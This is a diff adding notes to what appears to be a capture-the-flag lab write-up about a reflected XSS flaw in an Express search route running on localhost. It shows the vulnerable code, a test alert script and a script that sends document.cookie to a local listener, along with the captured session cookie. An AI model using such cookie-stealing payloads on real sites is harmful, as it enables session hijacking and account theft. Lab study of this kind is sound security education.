@@ -1,7 +1,30 @@
        [LEVEL 1]-TARGET: http://localhost:13001
 
-          
+          - Focus on file index.js:
 
+              ...
+                router.get('/search', function (req, res, next) {
+                    html = 'Your search - <b>' + req.query.q + '</b> - did not match any notes.<br><br>'
+                    res.send(html);
+                });
+              ...
 
+           => q will be parameter value in the query string.
 
+           - So we will try to add some html tags to that, try with: <a href="https://play.picoctf.org/">This is a tag</a>
+
+           => This is result: Your search - This is a tag - did not match any notes.
+           => *BOOM*  a tag has successful activated, click on 'This is a tag', you will go to https://play.picoctf.org/
+
+           - Try another type with script tag:  <script>alert("sthg will be here")</script>
+
+           => ... after click search you you get the notice 'sthg will be here' mean that it's successful.
+
+           - To make it more dangerous, try to steal the cookies data: 
+
+          => open http.server with port 12345
+
+       <script>const cookie = document.cookie; const cookiesteal = `http://localhost:12345/lol?cookie=${cookie}`;fetch(cookiesteal);</script>
+
+          => *Boom* "GET /lol?cookie=connect.sid=s%3Az5n3h8jDVEHvTkblMC-qvPFtVUk1YlRN.TjOKzCWWn3URo7g4f%2BgDlZNDsE3rBWFhSOf37hj%2FxMg HTTP/1.1" 404
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
